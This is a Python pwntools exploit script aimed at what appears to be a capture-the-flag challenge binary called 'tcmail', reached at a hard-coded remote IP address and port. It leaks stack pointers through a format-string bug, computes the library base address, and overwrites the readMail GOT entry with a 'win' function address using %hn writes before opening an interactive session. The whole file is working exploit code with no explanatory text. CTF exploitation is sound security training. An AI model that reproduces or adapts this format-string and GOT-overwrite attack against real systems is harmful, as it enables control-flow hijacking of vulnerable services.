from pwn import *
from struct import pack
from termcolor import colored


def GREEN(x): return colored(x, color="green", attrs=["bold"])


libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
libcmail = ELF("./libtcmail.so", checksec=False)
exe = context.binary = ELF("./tcmail_patched", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "critical"
context.bits = 64


class Exploit:
    def __init__(self, p: process) -> None:
        self.p = p

    def gdbdebug(self, script: str) -> None:
        attach(self.p, gdbscript=script)

    def send(self, num: int, content: bytes) -> None:
        p = self.p
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"> ", str(num).encode())
        p.sendafter(b"> ", content)

    def read(self, num: int) -> str:
        p = self.p
        p.sendlineafter(b"> ", b"2")
        p.sendlineafter(b"> ", str(num).encode())


def bruteleak(p: process) -> None:
    x = Exploit(p)
    for i in range(50):
        x.send(0, f"%{i}$p")
        x.read(0)
        print(f"{i}:", p.recvline().strip())
    # x.gdbdebug("vmmap")
    p.interactive()


# p = process()
p = remote("103.167.132.188", 12744)

# LEAK libcmail BASE
# bruteleak(p)
# exit()
x = Exploit(p)

libcmail_offset = 36
x.send(0, b"%"+str(libcmail_offset).encode()+b"$p")
x.read(0)
leaked_libcmail = eval(p.recvline().strip())
libcmail.address = leaked_libcmail - 15896

payload = "%{}c%15$hn".format(libcmail.symbols["win"] & 0xffff)

print(GREEN("[+] leaked libcmail{}  :".format(str(libcmail_offset))), hex(leaked_libcmail))
print(GREEN("[+] base libcmail      :"), hex(libcmail.address))
print(GREEN("[+] base readMail[got] :"), hex(exe.got["readMail"]))
print(GREEN("[+] win address        :"), hex(libcmail.symbols['win']))
print(GREEN("[+] win address[lower] :"), hex(libcmail.symbols['win'] & 0Xffff))
print(GREEN("[+] payload            :"), payload)
print(GREEN("[+] payload[8:]        :"), payload[8:])
print(GREEN("[+] payload[:8]        :"), payload[:8])

x.send(0, pack("<Q", exe.got["readMail"]))
x.send(1, payload[8:].ljust(8, "\x00").encode())
x.send(2, payload[:8].ljust(8, "\x00").encode())

# x.gdbdebug("break *main+88\nc")
x.read(2)
x.read(2)

p.interactive()
